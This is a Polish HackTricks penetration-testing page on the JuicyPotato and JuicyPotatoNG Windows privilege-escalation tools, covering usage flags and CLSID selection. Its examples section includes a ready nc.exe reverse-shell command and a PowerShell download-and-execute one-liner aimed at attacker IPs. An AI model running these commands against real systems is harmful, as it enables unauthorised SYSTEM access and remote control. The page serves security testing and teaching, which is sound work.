# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato jest legacy. Zasadniczo działa na wersjach Windows do Windows 10 1803 / Windows Server 2016 włącznie. Zmiany wprowadzone przez Microsoft począwszy od Windows 10 1809 / Server 2019 przerwały działanie oryginalnej techniki. W przypadku tych i nowszych buildów rozważ nowoczesne alternatywy, takie jak PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato i inne. Zobacz poniższą stronę, aby uzyskać aktualne opcje i informacje dotyczące użycia.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (nadużywanie golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Ulepszona wersja_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, z odrobiną juice, czyli **kolejne narzędzie Local Privilege Escalation, umożliwiające przejście z Windows Service Accounts do NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### JuicyPotato można pobrać z [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Krótkie informacje o kompatybilności

- Działa niezawodnie do Windows 10 1803 i Windows Server 2016 włącznie, gdy bieżący kontekst ma SeImpersonatePrivilege lub SeAssignPrimaryTokenPrivilege.
- Nie działa z powodu hardeningu Microsoftu w Windows 10 1809 / Windows Server 2019 i nowszych. W przypadku tych buildów preferuj powyżej podane alternatywy.

### Podsumowanie <a href="#summary" id="summary"></a>

[**Z pliku Readme projektu juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i jego [warianty](https://github.com/decoder-it/lonelypotato) wykorzystują łańcuch eskalacji uprawnień oparty na usłudze [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), która ma listener MiTM na `127.0.0.1:6666`, gdy dostępne są uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`. Podczas przeglądu builda Windows znaleźliśmy konfigurację, w której `BITS` było celowo wyłączone, a port `6666` był zajęty.

Postanowiliśmy uzbroić [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Powitajcie Juicy Potato**.

> Informacje dotyczące teorii znajdziesz w artykule [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) oraz w łańcuchu odnośników i referencji.<sup>[[4]](#references)</sup>

Oprócz `BITS` można nadużyć kilku serwerów COM. Muszą one jedynie:

1. być możliwe do utworzenia przez bieżącego użytkownika, zwykle „service user”, który ma uprawnienia do impersonation
2. implementować interfejs `IMarshal`
3. działać jako użytkownik z podwyższonymi uprawnieniami (SYSTEM, Administrator, …)

Po przeprowadzeniu testów uzyskaliśmy i przetestowaliśmy obszerną listę [interesujących CLSID](http://ohpe.it/juicy-potato/CLSID/) w kilku wersjach Windows.

### Szczegóły Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato umożliwia:<sup>[[1]](#references)</sup>

- **Docelowy CLSID** _wybierz dowolny CLSID._
- **Port nasłuchiwania COM** _zdefiniuj preferowany port nasłuchiwania COM (zamiast zahardkodowanego portu 6666 używanego przez marshaling)_
- **Adres IP nasłuchiwania COM** _powiąż serwer z dowolnym adresem IP_
- **Tryb tworzenia procesu** _w zależności od uprawnień impersonated user możesz wybrać:_
- `CreateProcessWithToken` (wymaga `SeImpersonate`)
- `CreateProcessAsUser` (wymaga `SeAssignPrimaryToken`)
- `both`
- **Proces do uruchomienia** _uruchom plik wykonywalny lub skrypt, jeśli exploitation zakończy się powodzeniem_
- **Argument procesu** _dostosuj argumenty uruchamianego procesu_
- **Adres serwera RPC** _dla podejścia stealth możesz uwierzytelnić się na zewnętrznym serwerze RPC_
- **Port serwera RPC** _przydatne, jeśli chcesz uwierzytelnić się na zewnętrznym serwerze, a firewall blokuje port `135`…_
- **Tryb TEST** _głównie do celów testowych, np. testowania CLSID. Tworzy DCOM i wyświetla użytkownika tokena. Zobacz_ [_tutaj informacje o testowaniu_](http://ohpe.it/juicy-potato/Test/)

### Użycie <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Końcowe przemyślenia <a href="#final-thoughts" id="final-thoughts"></a>

[**Z pliku Readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Jeśli użytkownik ma uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`, to jesteś **SYSTEM**.

Zapobieżenie nadużyciom wszystkich tych serwerów COM jest niemal niemożliwe. Można rozważyć modyfikację uprawnień tych obiektów za pomocą `DCOMCNFG`, ale powodzenia — będzie to wymagające.

Rzeczywistym rozwiązaniem jest ochrona wrażliwych kont i aplikacji działających na kontach `* SERVICE`. Zatrzymanie `DCOM` z pewnością uniemożliwiłoby ten exploit, ale mogłoby mieć poważny wpływ na bazowy system operacyjny.

Źródło: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG ponownie wprowadza local privilege escalation w stylu JuicyPotato na nowoczesnych systemach Windows, łącząc:<sup>[[2]](#references)</sup>
- Rozwiązywanie OXID DCOM do lokalnego serwera RPC na wybranym porcie, co pozwala uniknąć starego nasłuchującego procesu na sztywno ustawionego na 127.0.0.1:6666.
- Hook SSPI do przechwytywania i impersonacji przychodzącego uwierzytelnienia SYSTEM bez konieczności używania RpcImpersonateClient, co umożliwia również użycie CreateProcessAsUser, gdy obecne jest tylko SeAssignPrimaryTokenPrivilege.
- Triki pozwalające spełnić ograniczenia aktywacji DCOM (np. wcześniejszy wymóg grupy INTERACTIVE podczas atakowania klas PrintNotify / ActiveX Installer Service).

Ważne uwagi (zachowanie zmieniające się między buildami):<sup>[[2]](#references)</sup>
- Wrzesień 2022: Początkowa technika działała na obsługiwanych systemach Windows 10/11 oraz celach Server przy użyciu „triku INTERACTIVE”.
- Aktualizacja autorów ze stycznia 2023 r.: Microsoft później zablokował trik INTERACTIVE. Inny CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) przywraca możliwość wykorzystania podatności, ale według ich wpisu tylko w systemie Windows 11 / Server 2022.

Podstawowe użycie (więcej flag znajduje się w pomocy):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Jeśli celem jest Windows 10 1809 / Server 2019, gdzie classic JuicyPotato jest załatany, preferuj alternatywy podlinkowane na górze (RoguePotato, PrintSpoofer, EfsPotato/GodPotato itd.). NG może działać tylko w określonych sytuacjach, zależnie od builda i stanu usługi.

## Przykłady

Uwaga: odwiedź [tę stronę](https://ohpe.it/juicy-potato/CLSID/), aby znaleźć listę CLSID do wypróbowania.

### Uzyskaj reverse shell nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Uruchom nowe CMD (jeśli masz dostęp przez RDP)

![Powershell rev - Uruchom nowe CMD (jeśli masz dostęp przez RDP): Uruchom nowe CMD (jeśli masz dostęp przez RDP)](<../../images/image (300).png>)

## Problemy z CLSID

Często domyślny CLSID używany przez JuicyPotato **nie działa** i exploit kończy się niepowodzeniem. Zwykle potrzeba wielu prób, aby znaleźć **działający CLSID**. Aby uzyskać listę CLSID do sprawdzenia dla konkretnego systemu operacyjnego, odwiedź tę stronę:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Sprawdzanie CLSID**

Najpierw potrzebujesz kilku plików wykonywalnych oprócz juicypotato.exe.

Pobierz [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i załaduj go do swojej sesji PS, a następnie pobierz i wykonaj [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ten skrypt utworzy listę możliwych CLSID do sprawdzenia.

Następnie pobierz [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(zmień ścieżkę do listy CLSID oraz pliku wykonywalnego juicypotato) i wykonaj go. Rozpocznie się próba użycia każdego CLSID, a **gdy numer portu się zmieni, będzie to oznaczać, że CLSID zadziałał**.

**Sprawdź** działające CLSID **za pomocą parametru -c**

## References

- [1] [README Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Dajmy JuicyPotato drugą szansę: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Strona projektu Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Escalation uprawnień z kont usługowych do SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
